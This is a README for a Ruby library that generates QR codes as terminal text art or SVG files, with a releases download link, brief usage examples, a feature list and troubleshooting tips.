# 📱 qrcode - Generate QR Codes Easily

![Download QRCode](https://img.shields.io/badge/Download-QRCode-blue.svg)

## 🚀 Getting Started

Welcome to the QRCode project! This Ruby library lets you easily create QR codes. You can generate them as text art for your terminal or as scalable SVG graphics for websites and printed materials.

### 👩‍💻 System Requirements

- **Operating System:** Any OS that supports Ruby (Windows, macOS, Linux)
- **Ruby Version:** Ruby 2.5 or higher

## 📥 Download & Install

To get started, visit the Releases page to download the QRCode library. You can choose the version that suits your needs.

[Download QRCode](https://github.com/JB12345563/qrcode/releases)

Once you have downloaded the package:

1. Ensure you have Ruby installed on your computer.
2. Extract the contents from the downloaded file if necessary.
3. Follow the instructions provided in the extracted files to install the library.

## 📖 How to Use QRCode

After installation, using the QRCode library is simple. Here’s how you can generate a QR code in just a few steps:

1. **Open your terminal.**
2. **Start a Ruby script.** You can do this by creating a new file with a `.rb` extension.
3. **Require the QRCode library.** At the top of your file, include:

   ```ruby
   require 'qrcode'
   ```

4. **Generate a QR code.** Here’s a basic example:

   ```ruby
   qr = QRCode.new('Your text here')
   puts qr.as_text
   ```

   This will display your QR code in text format directly in the terminal.

5. **For SVG output**, you can do:

   ```ruby
   qr_svg = qr.as_svg
   File.write('qrcode.svg', qr_svg)
   ```

   This saves the generated QR code as an SVG file, which you can use on your website or print.

## ⚙️ Features

- **Pure Ruby**: No additional software is needed.
- **Multiple Output Formats**: Generate QR codes as text art or SVG graphics.
- **Automatic Optimization**: The library automatically chooses the best encoding method.
- **Error Correction**: Supports all four error correction levels (L, M, Q, H).
- **Multi-Segment Encoding**: Efficiently handles larger data.

## 🎨 Example Usage

You might want to create a QR code for a website link or a contact card. Below is an example that showcases how to generate a QR code for a URL:

```ruby
qr = QRCode.new('https://yourwebsite.com')
File.write('website_qrcode.svg', qr.as_svg)
```

This code generates a QR code for "https://yourwebsite.com" and saves it as an SVG file.

## 🛠️ Troubleshooting

If you encounter issues:

- **Installation Problems**: Ensure Ruby is installed correctly. Check your Ruby version with `ruby -v`.
- **Code Errors**: Double-check your syntax. Ruby is sensitive to typos.
- **Output Issues**: Verify your paths and look for any permission errors.

## 🌐 Additional Resources

- Visit the [QRCode Documentation](https://github.com/JB12345563/qrcode) for more examples and detailed guides.
- Check out the original [rqrcode_core](https://github.com/whomwah/rqrcode_core) for related libraries.
- Explore QR code best practices to ensure your codes are functional and effective.

## 🤝 Contributing

If you want to contribute to this project, feel free to fork the repository and submit pull requests. Your input can help make this library even better for everyone.